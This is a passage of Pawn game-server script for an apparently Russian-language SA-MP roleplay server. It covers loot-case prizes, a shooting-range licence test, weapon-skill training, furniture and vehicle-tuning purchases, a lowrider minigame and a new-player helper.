	|| GetPlayerSkin(playerid) == 217|| GetPlayerSkin(playerid) == 221|| GetPlayerSkin(playerid) == 222|| GetPlayerSkin(playerid) == 223|| GetPlayerSkin(playerid) == 227|| GetPlayerSkin(playerid) == 228|| GetPlayerSkin(playerid) == 229|| GetPlayerSkin(playerid) == 234||GetPlayerSkin(playerid) == 235
	|| GetPlayerSkin(playerid) == 236|| GetPlayerSkin(playerid) == 240|| GetPlayerSkin(playerid) == 247|| GetPlayerSkin(playerid) == 250|| GetPlayerSkin(playerid) == 252|| GetPlayerSkin(playerid) == 254|| GetPlayerSkin(playerid) == 258|| GetPlayerSkin(playerid) == 259
	|| GetPlayerSkin(playerid) == 262|| GetPlayerSkin(playerid) == 265|| GetPlayerSkin(playerid) == 266|| GetPlayerSkin(playerid) == 267|| GetPlayerSkin(playerid) == 272|| GetPlayerSkin(playerid) == 273
	|| GetPlayerSkin(playerid) == 274|| GetPlayerSkin(playerid) == 275|| GetPlayerSkin(playerid) == 276|| GetPlayerSkin(playerid) == 280|| GetPlayerSkin(playerid) == 281|| GetPlayerSkin(playerid) == 282|| GetPlayerSkin(playerid) == 286
	|| GetPlayerSkin(playerid) == 290|| GetPlayerSkin(playerid) == 291|| GetPlayerSkin(playerid) == 292|| GetPlayerSkin(playerid) == 294|| GetPlayerSkin(playerid) == 295|| GetPlayerSkin(playerid) == 296
	|| GetPlayerSkin(playerid) == 297|| GetPlayerSkin(playerid) == 298|| GetPlayerSkin(playerid) == 299|| GetPlayerSkin(playerid) == 300|| GetPlayerSkin(playerid) == 301
	|| GetPlayerSkin(playerid) == 302|| GetPlayerSkin(playerid) == 303|| GetPlayerSkin(playerid) == 304|| GetPlayerSkin(playerid) == 305|| GetPlayerSkin(playerid) == 310|| GetPlayerSkin(playerid) == 311)
	{
	    if(IsPlayerAttachedObjectSlotUsed(playerid, 0)) RemovePlayerAttachedObject(playerid, 0);
        SetPlayerAttachedObject(playerid, 5, 18638, 2, 0.157999, 0.028999, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.00, 1.057001);
	}
	return 0;
}
forward OpenCaseHide(playerid);
public OpenCaseHide(playerid)
{
	for(new i = 0; i < 25; i++) TextDrawHideForPlayer(playerid,Roulette[i]);
	for(new i = 0; i < 3; i++) PlayerTextDrawHide(playerid,RouletteP[i][playerid]);
 	CancelSelectTextDraw(playerid);
    DeletePVar(playerid,"OCK");
    DeletePVar(playerid,"OpenCase");
    TogglePlayerControllable(playerid, 1);
    if(Case[1] == 2) ShowPlayerDialog(playerid,277,DIALOG_STYLE_INPUT,"Введите ID скина","{FFFFFF}Введите ID желаемого скина, который вы хотите получить:","Далее","Отмена");
    return 1;
}
forward OpenCaseP(playerid);
public OpenCaseP(playerid)
{
    if(GetPVarInt(playerid,"OCK") > 1)
    {

        Case[2] = Case[1];
        PlayerTextDrawHide(playerid,RouletteP[2][playerid]);
        PlayerTextDrawSetPreviewModel(playerid, RouletteP[2][playerid], Case[2]);
        PlayerTextDrawShow(playerid,RouletteP[2][playerid]);
        Case[1] = Case[0];
        PlayerTextDrawHide(playerid,RouletteP[1][playerid]);
        PlayerTextDrawSetPreviewModel(playerid, RouletteP[1][playerid], Case[1]);
        PlayerTextDrawShow(playerid,RouletteP[1][playerid]);
        switch(random(25))
        {
            case 0..10: Case[0] = 1212;
            case 11..14: Case[0] = 1274;
            case 15..16: Case[0] = 2;
            case 17..20: Case[0] = 1210;
            case 21..25: Case[0] = 19134;
        }
        PlayerTextDrawHide(playerid,RouletteP[0][playerid]);
        PlayerTextDrawSetPreviewModel(playerid, RouletteP[0][playerid], Case[0]);
        PlayerTextDrawShow(playerid,RouletteP[0][playerid]);
        SetPVarInt(playerid,"OCK",GetPVarInt(playerid,"OCK")-1);
    }
    else
    {
		switch(Case[1])
		{
		    case 2: GameTextForPlayer(playerid, "~G~You Won Any Skin", 200, 1);
		    case 1212:
			{
			    new money;
			    switch(random(55))
			    {
			        case 0..10,20..30,46..55: money = 40000;
					case 11..19: money = 60000;
					case 31..36: money = 100000;
					case 37..40: money = 150000;
					case 41..43: money = 200000;
					case 44..45: money = 400000;
			    }
			    new str[20];
			    format(str,sizeof(str),"~G~You Won $%d",money);
				GameTextForPlayer(playerid, str, 200, 1);
				GiveMoney(playerid,money);
			}
		    case 1274:
			{
			    new money;
			    switch(random(10))
			    {
			        case 0..4: money = 60;
					case 5..8: money = 65;
					case 9..10: money = 70;
			    }
			    new str[20];
			    format(str,sizeof(str),"~G~You Won %d donate",money);
				GameTextForPlayer(playerid, str, 200, 1);
				PlayerInfo[playerid][pDonate] += money;
			}
		    case 19134:
			{
				GameTextForPlayer(playerid, "~G~You Won +5 exp", 200, 1),PlayerInfo[playerid][pExp] += 5;
				CheckLVL(playerid);
			}
		    case 1210:
			{
			    if(PlayerInfo[playerid][pVip] > gettime())
				{
				    new heh = PlayerInfo[playerid][pVip] - gettime();
				    PlayerInfo[playerid][pVip] = gettime()+60*60*24*6+heh;
				}
				else PlayerInfo[playerid][pVip] = gettime()+60*60*24*6;
				GameTextForPlayer(playerid, "~G~You Won 6 day VIP", 200, 1);
			}
		}
		KillTimer(GetPVarInt(playerid,"OCTimer"));
  		DeletePVar(playerid,"OCTimer");
        SetTimerEx("OpenCaseHide",3000,false,"i",playerid);
    }
    return 1;
}
stock CaptureUpd(num)
{
    static const fmt_string1[] = "_______~r~~h~%s~w~~h~: ~r~%d ~w~~h~kills_________";
	new str1[sizeof(fmt_string1)+30+4];
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
		new playerfrac = PlayerInfo[i][pMember]-6;
		new kem = CaptInfo[playerfrac][capture];
		new kemfrac = kem-6;
	    if(PlayerInfo[i][pMember] != num && CaptInfo[playerfrac][capture] != num) continue;
    	if(CaptInfo[playerfrac][gangnumber] == 1)
		{
		  //  new kem = CaptInfo[PlayerInfo[i][pMember]-6][capture];
			
			format(str1,sizeof(str1),fmt_string1,GangName(PlayerInfo[i][pMember]),CaptInfo[playerfrac][score]);
			PlayerTextDrawSetString(i,CaptPl[i][0],str1);
			
			format(str1,sizeof(str1),fmt_string1,GangName(kem),CaptInfo[kemfrac][score]);
			PlayerTextDrawSetString(i,CaptPl[i][2],str1);
		}
		else
		{
	 	//	new kem = CaptInfo[PlayerInfo[i][pMember]-6][capture];
			format(str1,sizeof(str1),fmt_string1,GangName(PlayerInfo[i][pMember]),CaptInfo[playerfrac][score]);
			PlayerTextDrawSetString(i,CaptPl[i][2],str1);
			format(str1,sizeof(str1),fmt_string1,GangName(kem),CaptInfo[kemfrac][score]);
			PlayerTextDrawSetString(i,CaptPl[i][0],str1);
		}

	}
}


forward GivePatr(playerid);
public GivePatr(playerid)
{
	for(new i = 0;i < 13;i++)
	{
		if(!GunInfo[playerid][pWeapon][i] || !GunInfo[playerid][pAmmo][i]) continue;
		GivePlayerWeapon(playerid,GunInfo[playerid][pWeapon][i],GunInfo[playerid][pAmmo][i]);
	}
	printf("givepatr");
	DeletePVar(playerid,"GiveGun");
	return 1;
}
forward MoveObjectOpenRot(objectid, Float:X, Float:Y, Float:Z, Float:Speed, Float:RotX, Float:RotY, Float:RotZ);
public MoveObjectOpenRot(objectid, Float:X, Float:Y, Float:Z, Float:Speed, Float:RotX, Float:RotY, Float:RotZ)
{
//	if(RotX == 0.0 && RotY == 0.0 && RotZ == 0.0) GetDynamicObjectRot(objectid,RotX,RotY,RotZ);
    MoveDynamicObject(objectid,X, Y, Z,Speed,   RotX, RotY, RotZ);
	return 1;
}
forward MoveObjectOpen(objectid, Float:X, Float:Y, Float:Z, Float:Speed);
public MoveObjectOpen(objectid, Float:X, Float:Y, Float:Z, Float:Speed)
{
//	if(RotX == 0.0 && RotY == 0.0 && RotZ == 0.0) GetDynamicObjectRot(objectid,RotX,RotY,RotZ);
    MoveDynamicObject(objectid,X, Y, Z,Speed);
	return 1;
}
CMD:gotest(playerid)
{
    switch(GetPVarInt(playerid,"AshPos"))
	{
	    case 0: CreateRange(playerid,1373.4355, -18.6052, 1004.2263,90.0,2,1,1383.6162,-18.6052,0.5);
		case 1: CreateRange(playerid,1373.4355, -14.9871, 1004.2263,90.0,2,1,1383.6162,-14.9871,0.5);
		case 2: CreateRange(playerid,1373.4258, -11.4161, 1004.2263,90.0,2,1,1383.6162,-11.4161,0.5);
	}

    SetPVarInt(playerid,"AshPos",0);
   // MoveDynamicObject(tirobj[GetPVarInt(player,"AshPos")],1383.6162,tirpos[GetPVarInt(player,"AshPos")][1],tirpos[GetPVarInt(player,"AshPos")][2],0.5);
    SetPVarInt(playerid,"AshCheck",1);
    DeletePVar(playerid,"AshCheckGun");
    GivePlayerWeapon(playerid,23,500);
    return 1;
}
public OnPlayerShootDynamicObject(playerid, weaponid, objectid, Float:x, Float:y, Float:z)
{
    if(!IsValidDynamicObject(objectid)) return;
    if(PlaneStatus == 3)
    {
        if(objectid == PlaneObj)
        {
            PlaneShot++;
            if(PlaneShot >= 100)
            {
                PlaneSklad -= 1;
                PlaneShot = 0;
                UpdatePlane();
            }
        }
    }
    if(Streamer_IsInArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, -2))
	{
	    static data[3];
		static player = INVALID_PLAYER_ID;
		Streamer_GetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);
		player = data[1];
		if(player == playerid && GetPVarInt(playerid,"AshCheck"))
		{
			DestroyDynamicObject(objectid);
			SetPVarInt(playerid,"AshCheckGun",GetPVarInt(playerid,"AshCheckGun")+1);
		    GameTextForPlayer(player, "~g~GOOD", 300, 6);
			if(GetPVarInt(playerid,"AshCheckGun") > 6)
			{
			   // SetDynamicObjectPos(tirobj[GetPVarInt(playerid,"AshPos")],tirpos[GetPVarInt(playerid,"AshPos")][0],tirpos[GetPVarInt(playerid,"AshPos")][1],tirpos[GetPVarInt(playerid,"AshPos")][2]);
			    DeletePVar(playerid,"AshCheckGun");
			    ResetPlayerWeapons(playerid);
				switch(GetPVarInt(playerid,"AshPos"))
				{
				    case 0: CreateRange(playerid,1373.4355, -18.6052, 1004.2263,90.0,2,1,1383.6162,-18.6052,0.5);
					case 1: CreateRange(playerid,1373.4355, -14.9871, 1004.2263,90.0,2,1,1383.6162,-14.9871,0.5);
					case 2: CreateRange(playerid,1373.4258, -11.4161, 1004.2263,90.0,2,1,1383.6162,-11.4161,0.5);
				}

			    switch(weaponid)
       			{
			        case 23: GivePlayerWeapon(playerid,24,500);
			        case 24: GivePlayerWeapon(playerid,25,500);
			        case 25: GivePlayerWeapon(playerid,29,500);
			        case 29: GivePlayerWeapon(playerid,30,500);
			        case 30: GivePlayerWeapon(playerid,31,500);
			        case 31: 
			        {
						SendClientMessage(playerid,CREWARD,"Вы успешно завершили тестирование!");
						DeletePVar(playerid,"GoLic");
						PlayerInfo[playerid][pLic][L_GUN] = 1;
						PlayerInfo[playerid][pLicTime][L_GUN] = gettime()+60*60*24*90;
						ExitTir(playerid);
			        }
			    }
			}
		}
		if(player == playerid && GetPVarInt(playerid,"Tir"))
		{
			switch(weaponid)
			{
				case 23..25:
				{
					if(PlayerInfo[player][pGunSkill][weaponid - 23] < 1000)
					{
						if(PlayerInfo[playerid][pVip] < gettime() && !PlayerInfo[playerid][pUl][1]) PlayerInfo[player][pGunSkill][weaponid - 23] += levelammo[player];
						else PlayerInfo[player][pGunSkill][weaponid - 23] += levelammo[player]*2;

					}
					else
					{
					    SetPlayerVirtualWorld(playerid, GetPVarInt(playerid,"AmmoV"));
						SPPos(playerid,300.3766,-78.0825,1001.5229);
						shot__player[playerid] = 0;
						levelammo[playerid] = 0;
						format(PlayerInfo[playerid][pSkills],50,"%i,%i,%i,%i,%i,%i,%i",PlayerInfo[playerid][pGunSkill][0],PlayerInfo[playerid][pGunSkill][1],PlayerInfo[playerid][pGunSkill][2],PlayerInfo[playerid][pGunSkill][3],
						PlayerInfo[playerid][pGunSkill][4],PlayerInfo[playerid][pGunSkill][0],PlayerInfo[playerid][pGunSkill][5],PlayerInfo[playerid][pGunSkill][6]);
						SetPlayerStr(PlayerInfo[playerid][pSendername],"skills",PlayerInfo[playerid][pSkills]);
						DeletePVar(playerid,"Tir");
						DeletePVar(playerid,"AmmoV");
						DeletePVar(playerid,"short__shop");
						ResetPlayerWeapons(playerid);
						PlayerTextDrawDestroy(playerid,InfoText[playerid]);
						for(new gSL; gSL < 3; gSL++) TextDrawHideForPlayer(playerid, PressH[gSL]);
						DestroyDynamicObject(GetPVarInt(playerid,"ObjectTir1"));
						DestroyDynamicObject(GetPVarInt(playerid,"ObjectTir2"));
						DeletePVar(playerid,"ObjectTir1");
						DeletePVar(playerid,"ObjectTir2");
						PlayerInfo[player][pGunSkill][weaponid - 23] = 1000, SendClientMessage(playerid,COLOR_ORANGE,"Вы успешно прокачали скиллы данного оружия");
					}
				}
				case 29..31:
				{
					if(PlayerInfo[player][pGunSkill][weaponid - 26] < 1000)
					{
						if(PlayerInfo[playerid][pVip] < gettime() && !PlayerInfo[playerid][pUl][1]) PlayerInfo[player][pGunSkill][weaponid - 26] += levelammo[player];
						else PlayerInfo[player][pGunSkill][weaponid - 26] += levelammo[player]*2;
					}
					else
					{
						SetPlayerVirtualWorld(playerid, GetPVarInt(playerid,"AmmoV"));
						SPPos(playerid,300.3766,-78.0825,1001.5229);
						shot__player[playerid] = 0;
						levelammo[playerid] = 0;
						format(PlayerInfo[playerid][pSkills],50,"%i,%i,%i,%i,%i,%i,%i",PlayerInfo[playerid][pGunSkill][0],PlayerInfo[playerid][pGunSkill][1],PlayerInfo[playerid][pGunSkill][2],PlayerInfo[playerid][pGunSkill][3],
						PlayerInfo[playerid][pGunSkill][4],PlayerInfo[playerid][pGunSkill][0],PlayerInfo[playerid][pGunSkill][5],PlayerInfo[playerid][pGunSkill][6]);
						SetPlayerStr(PlayerInfo[playerid][pSendername],"skills",PlayerInfo[playerid][pSkills]);
						DeletePVar(playerid,"Tir");
						DeletePVar(playerid,"AmmoV");
						DeletePVar(playerid,"short__shop");
						ResetPlayerWeapons(playerid);
						PlayerTextDrawDestroy(playerid,InfoText[playerid]);
						for(new gSL; gSL < 3; gSL++) TextDrawHideForPlayer(playerid, PressH[gSL]);
						DestroyDynamicObject(GetPVarInt(playerid,"ObjectTir1"));
						DestroyDynamicObject(GetPVarInt(playerid,"ObjectTir2"));
						DeletePVar(playerid,"ObjectTir1");
						DeletePVar(playerid,"ObjectTir2");
						PlayerInfo[player][pGunSkill][weaponid - 26] = 1000, SendClientMessage(playerid,COLOR_ORANGE,"Вы успешно прокачали скиллы данного оружия");
					}
				}
			}
		    SetPlayerSkills(playerid);
		    shot__player[player]++;
		    switch(weaponid)
		    {
		    	case 23..25: if(shot__player[player] >= 40) levelammo[playerid] += 1,shot__player[player] = 0;
		    	case 29..31: if(shot__player[player] >= 70) levelammo[playerid] += 1,shot__player[player] = 0;
		    }
		    new st[32];
		    format(st,sizeof(st),"~g~+%i point",levelammo[player] -1);
		    GameTextForPlayer(player, st, 300, 6);
		}
	}
}

ac__GetFloatDifference(Float: Number1, Float: Number2) return floatround(Number1 > Number2 ? Number1 - Number2 : Number2 - Number1);
stock AddCheater(playerid)
{
	if(PlayerInfo[playerid][pAdmin]) return true;
    new str[10];
    format(str, sizeof(str), "%d", playerid);
    for(new i = 0; i < 10; i++)
    {
        if(Cheater[i] != playerid) continue;
        format(str, sizeof(str), "~r~%d", playerid);
        break;
    }
    TextDrawSetString(CheatText[Cheat], str);
    Cheater[Cheat] = playerid;
    Cheat ++;
    if(Cheat > 8) Cheat = 0;
    
    return 1;
}

stock SetMebel(playerid)
{
    new model, price, length;
    
    new name[10];
    strmid(name, get_furniture(GetPVarInt(playerid,"MebelRaz"),GetPVarInt(playerid,"MebelCheck"), model, price, length), 0, 10, 10);
    if(GetPVarInt(playerid,"MebelCheck") > length) DeletePVar(playerid,"MebelCheck");
    if(GetPVarInt(playerid,"MebelCheck") < 0) SetPVarInt(playerid,"MebelCheck",length);
    if(GetPVarInt(playerid,"MebelRaz") != 10)
    {
	    static const fmt_str21[] = "%s %d";
		new stri2ng1[sizeof(fmt_str21)+3+10];
		format(stri2ng1, sizeof(stri2ng1), fmt_str21, name, GetPVarInt(playerid,"MebelCheck")+1);
		PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],stri2ng1);
	}
	else
	{
	    //Карта лв,барабаны, камин 1, камин 2, лошадка, флаг, мини сцена, машинка для тату
	    switch(GetPVarInt(playerid,"MebelCheck"))
		{
			case 0: PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],"MAP OF LV");
			case 1: PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],"DRUMS");
			case 2: PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],"FIREPLACE 1");
			case 3: PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],"FIREPLACE 2");
			case 4: PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],"HORSE");
			case 5: PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],"FLAGS");
			case 6: PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],"tattoo machine");
		}
	}
    static const fmt_str221[] = "%sS";
	new stri2n2g1[sizeof(fmt_str221)+10];
	format(stri2n2g1, sizeof(stri2n2g1), fmt_str221, name);
	PlayerTextDrawSetString(playerid,ObjectBuyP[1][playerid],stri2n2g1);
	static const fmt_str1[] = "$%i";
	new string1[sizeof(fmt_str1)+10];
	format(string1, sizeof(string1), fmt_str1, price);
	PlayerTextDrawSetString(playerid,ObjectBuyP[2][playerid],string1);
	if(furniture_pickup[playerid] != -1) DestroyDynamicPickup(furniture_pickup[playerid]),furniture_pickup[playerid] = -1;
	furniture_pickup[playerid] = CreateDynamicPickup(model, 1, 1380.1483,-26.6653,1000.9131,GetPlayerVirtualWorld(playerid));
	return 1;
}
stock GetL(c)
{
	new length;
    length=(c==0)?(sizeof(furniture_beds)):(c==1)?(sizeof(furniture_table)):(c==2)?(sizeof(furniture_chairs)):(c==3)?(sizeof(furniture_electronics)):(c==4)?(sizeof(furniture_kitchen)):(c==5)?(sizeof(furniture_chests)):(c==6)?(sizeof(furniture_bathroom)):(c==7)?(sizeof(furniture_sofas)):(c==8)?(sizeof(furniture_picture)):(c==9)?(sizeof(furniture_plants)):(sizeof(furniture_others));
	return length;
}
stock GetPriceModel(c, b, &model, &price)
{
    model=(c==0)?(furniture_beds[b]):(c==1)?(furniture_table[b]):(c==2)?(furniture_chairs[b]):(c==3)?(furniture_electronics[b]):(c==4)?(furniture_kitchen[b]):(c==5)?(furniture_chests[b]):(c==6)?(furniture_bathroom[b]):(c==7)?(furniture_sofas[b]):(c==8)?(furniture_picture[b]):(c==9)?(furniture_plants[b]):(c==10)?(furniture_others[b]):(-1);
	price=Furn_GetPrice(model);
	return 1;
}
stock get_furniture(c, b, &model, &price, &length)
{
	new name_furn[10];
	if(c < 0 || c > 10) return name_furn;
	length=(c==0)?(sizeof(furniture_beds)):(c==1)?(sizeof(furniture_table)):(c==2)?(sizeof(furniture_chairs)):(c==3)?(sizeof(furniture_electronics)):(c==4)?(sizeof(furniture_kitchen)):(c==5)?(sizeof(furniture_chests)):(c==6)?(sizeof(furniture_bathroom)):(c==7)?(sizeof(furniture_sofas)):(c==8)?(sizeof(furniture_picture)):(c==9)?(sizeof(furniture_plants)):(sizeof(furniture_others));
	if ( b>=length ) b=0;
	model=(c==0)?(furniture_beds[b]):(c==1)?(furniture_table[b]):(c==2)?(furniture_chairs[b]):(c==3)?(furniture_electronics[b]):(c==4)?(furniture_kitchen[b]):(c==5)?(furniture_chests[b]):(c==6)?(furniture_bathroom[b]):(c==7)?(furniture_sofas[b]):(c==8)?(furniture_picture[b]):(c==9)?(furniture_plants[b]):(c==10)?(furniture_others[b]):(-1);
	price=Furn_GetPrice(model);
	format(name_furn,10,"%s",(c==0)?("BED"):(c==1)?("TABLE"):(c==2)?("CHAIR"):(c==3)?("TECH"):(c==4)?("KITCHEN"):(c==5)?("CHEST"):(c==6)?("BATHROOM"):(c==7)?("SOFA"):(c==8)?("PICTURE"):(c==9)?("PLANT"):("OTHER"));
 	return name_furn;
}
stock Furn_GetNameClass(modelid)
{
	new i=0,name_classes[12][32]={
		"BED",
		"TABLE",
		"CHAIR",
		"TECH",
		"KITCHEN",
		"CHEST",
		"BATHROOM",
		"SOFA",
		"PICTURE",
		"PLANT",
		"OTHER",
		"UNKNOWN"};
	for(i = 0; i < sizeof(furniture_beds); i++) if(furniture_beds[i] == modelid) return name_classes[0];
	for(i = 0; i < sizeof(furniture_table); i++) if(furniture_table[i] == modelid) return name_classes[1];
	for(i = 0; i < sizeof(furniture_chairs); i++) if(furniture_chairs[i] == modelid) return name_classes[2];
	for(i = 0; i < sizeof(furniture_electronics); i++) if(furniture_electronics[i] == modelid) return name_classes[3];
	for(i = 0; i < sizeof(furniture_kitchen); i++) if(furniture_kitchen[i] == modelid) return name_classes[4];
	for(i = 0; i < sizeof(furniture_chests); i++) if(furniture_chests[i] == modelid) return name_classes[5];
	for(i = 0; i < sizeof(furniture_bathroom); i++) if(furniture_bathroom[i] == modelid) return name_classes[6];
	for(i = 0; i < sizeof(furniture_sofas); i++) if(furniture_sofas[i] == modelid) return name_classes[7];
	for(i = 0; i < sizeof(furniture_picture); i++) if(furniture_picture[i] == modelid) return name_classes[8];
	for(i = 0; i < sizeof(furniture_plants); i++) if(furniture_plants[i] == modelid) return name_classes[9];
	for(i = 0; i < sizeof(furniture_others); i++) if(furniture_plants[i] == modelid) return name_classes[10];
	return name_classes[10];
}
stock Furn_GetPrice(modelid)
{
	new i = 0 , price = -1;
	for(i = 0; i < sizeof(furniture_beds); i++) if(furniture_beds[i] == modelid) price = furniture_beds_price[i];
	for(i = 0; i < sizeof(furniture_table); i++) if(furniture_table[i] == modelid) price = furniture_table_price[i];
	for(i = 0; i < sizeof(furniture_chairs); i++) if(furniture_chairs[i] == modelid) price = furniture_chairs_price[i];
	for(i = 0; i < sizeof(furniture_electronics); i++) if(furniture_electronics[i] == modelid) price = furniture_electronics_price[i];
	for(i = 0; i < sizeof(furniture_kitchen); i++) if(furniture_kitchen[i] == modelid) price = furniture_kitchen_price[i];
	for(i = 0; i < sizeof(furniture_chests); i++) if(furniture_chests[i] == modelid) price = furniture_chests_price[i];
	for(i = 0; i < sizeof(furniture_bathroom); i++) if(furniture_bathroom[i] == modelid) price = furniture_bathroom_price[i];
	for(i = 0; i < sizeof(furniture_sofas); i++) if(furniture_sofas[i] == modelid) price = furniture_sofas_price[i];
	for(i = 0; i < sizeof(furniture_picture); i++) if(furniture_picture[i] == modelid) price = furniture_picture_price[i];
	for(i = 0; i < sizeof(furniture_plants); i++) if(furniture_plants[i] == modelid) price = furniture_plants_price[i];
	for(i = 0; i < sizeof(furniture_others); i++) if(furniture_others[i] == modelid) price = furniture_others_price[i];
	if ( price > 25000 ) price = 12000;
	return price;
}

stock TuningBuy(playerid,name[],detal,cena)
{
	SetPVarInt(playerid,"STODet",detal);
	AddVehicleComponent(GetPlayerVehicleID(playerid), detal);
	SetPVarInt(playerid,"STOPrice",cena);
	static const fmt_str221[] = "{FFFFFF}Вы хотите установить данную деталь?\nЦена: $%d";
	new stri2n2g1[sizeof(fmt_str221)+3];
	format(stri2n2g1, sizeof(stri2n2g1), fmt_str221, cena);
	ShowPlayerDialog(playerid,128,DIALOG_STYLE_MSGBOX,name,stri2n2g1,"Да","Нет");
	return true;
}
stock TuningBuyD(playerid,name[],detal,detal1,cena)
{
	SetPVarInt(playerid,"STODet",detal);
	SetPVarInt(playerid,"STODet1",detal1);
	AddVehicleComponent(GetPlayerVehicleID(playerid), detal);
	AddVehicleComponent(GetPlayerVehicleID(playerid), detal1);
	SetPVarInt(playerid,"STOPrice",cena);
	static const fmt_str221[] = "{FFFFFF}Вы хотите установить данную деталь?\nЦена: $%d";
	new stri2n2g1[sizeof(fmt_str221)+3];
	format(stri2n2g1, sizeof(stri2n2g1), fmt_str221, cena);
	ShowPlayerDialog(playerid,317,DIALOG_STYLE_MSGBOX,name,stri2n2g1,"Да","Нет");
	return true;
}
stock StartLowRide(playerid,playerd)
{
	new carid = GetPlayerVehicleID(playerid);
	SetVehicleVirtualWorld(carid,playerid+playerd);
	SetPlayerVirtualWorld(playerid,playerid+playerd);
	PutPlayerInVehicle(playerid,carid,0);
	PlayerChangeImage(playerid, false);
	new randomImage = random(sizeof(SelectedImage));
	PlayerTextDrawSetString(playerid, LRArrows[playerid][0], SelectedImage[randomImage]);
	PlayerTextDrawShow(playerid,LRArrows[playerid][0]);
	TextDrawShowForPlayer(playerid,KrugL);
	PlayerImageID[playerid][0] = randomImage;
	PlayerTextDrawSetString(playerid, PointsTD[playerid][0], "LOWRIDE POINTS: ~r~0");
	PlayerTextDrawShow(playerid,PointsTD[playerid][0]);
	SendClientMessage(playerid,-1,"У Вас есть полторы минуты, чтобы выиграть соперника!");
	return true;
}
stock StopLowRide(x)
{
    DeletePVar(x,"LowRide");
	DeletePVar(x,"InLowRide");
	PlayerTextDrawHide(x,LRArrows[x][0]);
    PlayerTextDrawHide(x,LRArrows[x][1]);
    PlayerTextDrawHide(x,LRArrows[x][2]);
    TextDrawHideForPlayer(x,KrugL);
    new carid = GetPlayerVehicleID(x);
    PlayerTextDrawHide(x,PointsTD[x][0]);
    SetVehicleVirtualWorld(carid,0);
	SetPlayerVirtualWorld(x,0);
	PutPlayerInVehicle(x,carid,0);
	return true;
}
stock CheckJobHelp(playerid)
{
    if(PlayerInfo[playerid][pHelp] == 2 && PlayerInfo[playerid][pCash] >= 750)
    {
        if(PlayerInfo[playerid][pLic][0])
        {
            SendClientMessage(playerid,CREWARD,"[Помощник]{ffffff} Я вижу ты уже получил права. Теперь ты можешь устроится на более прибыльную работу или вступить в организацию.");
			SendClientMessage(playerid,CREWARD,"[Помощник]{ffffff} Посоветую тебе купить телефон для связи в ближайшем 24/7.");
			PlayerInfo[playerid][pHelp] = 0;
        }
        else
        {
	        SendClientMessage(playerid,CREWARD,"[Помощник]{ffffff} Отлично! Теперь выдвигайся в автошколу для сдачи экзамена на права.");
			SendClientMessage(playerid,CREWARD,"[Помощник]{ffffff} Автошколу я отметил тебе на карте.");
			PlayerInfo[playerid][pHelp] = 3;
			SetPlayerRaceCheckpoint(playerid,2,1166.5098,1371.6294,10.8203,0,0,0,10); //ash
			SetPVarInt(playerid,"GPS",1);
		}
    }
    return 1;
}
stock SayBot(text[],color,bot,Text3D:textdraw)
{
    ApplyDynamicActorAnimation(bot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
	Update3DTextLabelTextEx(textdraw,color,text);
	SetTimerEx("ClearBotGlobal", 3000, false,"dd",bot,_:textdraw);
	return true;
}

stock GetIDRC(step = 0)
{
	new ids = -1;
	if(!step)
	{
		for(new i = 0; i < sizeof(CarRobPos); i++)
		{
		    if(!IsValidVehicle(CarRob[i]) || !GetVehicleVirtualWorld(CarRob[i])) continue;
		    ids = i;
		    break;
		}
	}
	if(ids != -1)
	{
		new rand = random(sizeof(CarRobPos));
		if(!IsValidVehicle(CarRob[rand]) || !GetVehicleVirtualWorld(CarRob[rand])) return GetIDRC(1);
		ids = rand;
	}
	return ids;
}

stock FreezePlayer(playerid,Float:x,Float:z,Float:ras = 0.91)
{

    DeletePVar(playerid,"Freeze");
    if(!GetPVarInt(playerid,"CloseT"))
	{
	    printf("FreezePlayer");
	    TogglePlayerControllable(playerid, 0);
	    new obj = CreatePlayerObject(playerid,19464,x,180,z-ras,0.0,90.0,0.0,50.0);
	    for(new i; i< 10; i++) { SetPlayerObjectMaterial(playerid, obj, i, 0, "none", "none", HexToInt("0xRRGGBB00")); }
	
		TexturesLoadingP[playerid] = CreatePlayerTextDraw(playerid, 211.666625, 418.555541, "LD_SPAC:white"); // box procent of loading
		PlayerTextDrawLetterSize(playerid, TexturesLoadingP[playerid], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, TexturesLoadingP[playerid], 4.10666686, 12.444457);
		PlayerTextDrawAlignment(playerid, TexturesLoadingP[playerid], 1);
		PlayerTextDrawColor(playerid, TexturesLoadingP[playerid], -36827905);
		PlayerTextDrawSetShadow(playerid, TexturesLoadingP[playerid], 0);
		PlayerTextDrawSetOutline(playerid, TexturesLoadingP[playerid], 0);
		PlayerTextDrawFont(playerid, TexturesLoadingP[playerid], 4);

		for(new i = 0; i < 8; i++) TextDrawShowForPlayer(playerid,TexturesLoading[i]);
		PlayerTextDrawShow(playerid,TexturesLoadingP[playerid]);
		SetPVarInt(playerid,"CloseT",5);
		SetPVarInt(playerid,"CloseObj",obj);
	//	SetPVarInt(playerid,"CloseTimer",SetTimerEx("CloseThis",250,true,"dd",playerid,obj));
	}

}



stock HexToInt(string[])
{
    if (string[0] == 0)
    {
        return 0;
    }
    new i;
    new cur = 1;
    new res = 0;
    for (i = strlen(string); i > 0; i--)
    {
        if (string[i-1] < 58)
        {
            res = res + cur * (string[i - 1] - 48);
        }
        else
        {
            res = res + cur * (string[i-1] - 65 + 10);
            cur = cur * 16;
        }
    }
    return res;
}
stock StartHack(playerid)
{
	ProgressBarP[0][playerid] = CreatePlayerTextDraw(playerid, 322.500030, 314.600036, "ld_beat:cross"); // press this  object player text
	PlayerTextDrawLetterSize(playerid, ProgressBarP[0][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, ProgressBarP[0][playerid], 10.000001, 11.614806);
	PlayerTextDrawAlignment(playerid, ProgressBarP[0][playerid], 1);
	PlayerTextDrawColor(playerid, ProgressBarP[0][playerid], -1);
	PlayerTextDrawSetShadow(playerid, ProgressBarP[0][playerid], 0);
